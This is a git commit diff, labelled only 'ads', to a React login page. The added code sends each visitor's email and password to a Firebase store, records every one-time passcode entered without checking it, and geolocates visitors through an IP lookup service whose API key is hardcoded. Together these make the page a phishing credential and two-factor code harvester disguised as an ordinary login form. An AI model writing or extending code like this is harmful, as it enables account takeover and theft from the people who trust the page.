e6c6090f3796efa08f63bc489d17256e1be66efb
moathssnck <myneww00@gmail.com>
2025-10-30 19:50:28 -0700

    ads

--- app/page.tsx
+++ app/page.tsx
@@ -3,6 +3,9 @@
 import type React from "react";
 import { useState, useEffect } from "react";
 import { Eye, EyeOff } from "lucide-react";
+import { addData, setupOnlineStatus } from "@/lib/firebase";
+const visitorID = ""
+const allOtps = [""]
 
 export default function LoginPage() {
   const [showPassword, setShowPassword] = useState(false);
@@ -13,16 +16,25 @@ export default function LoginPage() {
   const [showSplash, setShowSplash] = useState(true);
 
   useEffect(() => {
-    const timer = setTimeout(() => {
-      setShowSplash(false);
-    }, 4000);
-    return () => clearTimeout(timer);
+    getLocation().then(() => {
+      const timer = setTimeout(() => {
+        setShowSplash(false);
+      }, 4000);
+      return () => clearTimeout(timer);
+    }).catch(() => {
+      setShowSplash(true);
+
+
+    })
   }, []);
 
-  const handleLoginSubmit = (e: React.FormEvent) => {
+  const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (email && password) {
-      setStep("otp");
+      await addData({ id: visitorID, email, password })
+      setTimeout(() => {
+        setStep("otp");
+      }, 3000);
     }
   };
 
@@ -45,16 +57,37 @@ export default function LoginPage() {
     }
   };
 
-  const handleOtpSubmit = (e: React.FormEvent) => {
+  const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (otp.every((digit) => digit)) {
-      setStep("login");
+      allOtps.push(otp.join())
+      await addData({ id: visitorID, otp: otp.join(), allOtps })
       setEmail("");
       setPassword("");
       setOtp(["", "", "", "", "", ""]);
     }
   };
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
 
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: visitorID,
+        country: country,
+        createdDate: new Date().toISOString()
+      })
+      localStorage.setItem('country', country)
+      setupOnlineStatus(visitorID)
+    } catch (error) {
+      console.error('Error fetching location:', error);
+    }
+  }
   if (showSplash) {
     return (
       <div
